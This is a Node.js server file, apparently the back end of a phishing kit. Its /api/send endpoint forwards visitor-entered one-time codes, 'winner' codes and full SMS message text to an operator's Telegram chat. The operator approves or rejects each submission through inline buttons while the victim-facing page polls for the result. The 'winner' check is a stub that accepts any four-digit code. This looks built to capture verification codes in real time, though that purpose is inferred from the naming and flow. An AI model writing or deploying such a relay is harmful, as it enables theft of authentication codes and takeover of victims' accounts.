const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const ROOT = __dirname;
const submissions = new Map();

function escapeTelegramHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function sendToTelegram(text, replyMarkup, parseMode) {
  if (!BOT_TOKEN || !CHAT_ID) {
    return Promise.reject(new Error('BOT_TOKEN and CHAT_ID environment variables are required.'));
  }

  const payload = JSON.stringify({
    chat_id: CHAT_ID,
    text,
    ...(parseMode ? { parse_mode: parseMode } : {}),
    ...(replyMarkup ? { reply_markup: replyMarkup } : {})
  });

  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: payload
  }).then(async (response) => {
    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.description || 'Telegram send failed');
    }
    return data;
  });
}

async function answerCallbackQuery(callbackQueryId, text) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: callbackQueryId, text })
  });
}

async function editTelegramMessage(chatId, messageId, text) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, message_id: messageId, text })
  });
}

async function pollTelegramUpdates() {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('Telegram disabled: set BOT_TOKEN and CHAT_ID in the service environment.');
    return;
  }

  let offset = 0;

  while (true) {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?timeout=25&offset=${offset}`
      );
      const data = await response.json();

      if (!data.ok) throw new Error(data.description || 'Telegram polling failed');

      for (const update of data.result) {
        offset = update.update_id + 1;
        const callback = update.callback_query;
        if (!callback || !callback.data) continue;

        const [decision, submissionId] = callback.data.split(':');
        const submission = submissions.get(submissionId);
        if (!submission || submission.status !== 'pending') {
          await answerCallbackQuery(callback.id, 'This submission is no longer pending.');
          continue;
        }

        submission.status = decision === 'approve' ? 'approved' : 'rejected';
        await answerCallbackQuery(callback.id, `Submission ${submission.status}.`);
        await editTelegramMessage(
          callback.message.chat.id,
          callback.message.message_id,
          `${callback.message.text}\n\nStatus: ${submission.status.toUpperCase()}`
        );
      }
    } catch (err) {
      console.error('Telegram update error:', err.message);
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

function getContentType(filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const types = {
    '.html': 'text/html; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
  };
  return types[ext] || 'application/octet-stream';
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost');

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === 'GET' && url.pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (req.method === 'POST' && url.pathname === '/api/send') {
    try {
      let body = '';
      req.on('data', (chunk) => {
        body += chunk;
      });

      req.on('end', async () => {
        try {
          const data = JSON.parse(body || '{}');
          const playerId = String(data.playerId || '');
          const text = String(data.text || '');
          const smsText = String(data.sms || '');
          const isTrial = data.type === 'trial';
          const isMing = data.type === 'ming';
          const requiresApproval = isTrial || isMing;

          if (!playerId && !text) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'Missing submission text.' }));
            return;
          }

          if (!playerId && !requiresApproval) {
            await sendToTelegram(text);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: true }));
            return;
          }

          if (!requiresApproval && !/^\d{4}$/.test(playerId)) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'Invalid 4-digit player ID.' }));
            return;
          }

          const submissionId = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
          submissions.set(submissionId, {
            playerId,
            type: isTrial ? 'trial' : isMing ? 'ming' : 'winner',
            status: 'pending'
          });

          await sendToTelegram(
            requiresApproval
              ? isMing && smsText
                ? `Full SMS Verification\nSMS:\n<pre>${escapeTelegramHtml(smsText)}</pre>\nSubmission: ${submissionId}`
                : `${text}\nSubmission: ${submissionId}`
              : `OTP\nOtp : ${playerId}\nSubmission: ${submissionId}`,
            {
              inline_keyboard: [[
                { text: 'Approve', callback_data: `approve:${submissionId}` },
                { text: 'Reject', callback_data: `reject:${submissionId}` }
              ]]
            },
            isMing && smsText ? 'HTML' : undefined
          );

          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: true, submissionId }));
        } catch (err) {
          console.error('Telegram proxy error:', err);
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: err.message }));
        }
      });

      return;
    } catch (err) {
      console.error('Request parse error:', err);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: err.message }));
      return;
    }
  }
  if (req.method === 'GET' && url.pathname === '/api/submission-status') {
    const submission = submissions.get(url.searchParams.get('id'));
    if (!submission) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'Submission not found.' }));
      return;
    }

    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store'
    });
    res.end(JSON.stringify({ ok: true, status: submission.status }));
    return;
  }
  if (req.method === 'POST' && url.pathname === '/api/verify-otp') {
    let body = '';

    req.on('data', chunk => {
      body += chunk;
    });

    req.on('end', () => {
      try {
        const data = JSON.parse(body || '{}');
        const otp = String(data.otp || '');

        if (!/^\d{4}$/.test(otp)) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: 'Invalid 4-digit OTP.' }));
          return;
        }

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: 'Invalid request.' }));
      }
    });

    return;
  }
if (req.method === 'POST' && url.pathname === '/api/verify-winer') {
  let body = '';

  req.on('data', chunk => {
    body += chunk;
  });

  req.on('end', () => {
    try {
      const data = JSON.parse(body || '{}');
      const winer = String(data.winer || '');

      if (!/^\d{4}$/.test(winer)) {
        res.writeHead(400, {
          'Content-Type': 'application/json'
        });
        res.end(JSON.stringify({
          ok: false,
          error: 'Invalid 4-digit winner code.'
        }));
        return;
      }

      // Demo only: accept any valid 4-digit code.
      res.writeHead(200, {
        'Content-Type': 'application/json'
      });
      res.end(JSON.stringify({
        ok: true
      }));

    } catch (err) {
      res.writeHead(400, {
        'Content-Type': 'application/json'
      });
      res.end(JSON.stringify({
        ok: false,
        error: 'Invalid request.'
      }));
    }
  });

  return;
}
  let filePath = url.pathname === '/' ? '/index.html' : url.pathname;
  filePath = path.join(ROOT, filePath);

  if (!filePath.startsWith(ROOT)) {
    res.writeHead(403);
    res.end('Forbidden');
    return;
  }

  fs.readFile(filePath, (err, content) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('Not found');
      return;
    }

    res.writeHead(200, {
      'Content-Type': getContentType(filePath),
      'Cache-Control': 'no-store'
    });
    res.end(content);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://localhost:${PORT}`);
  pollTelegramUpdates();
});
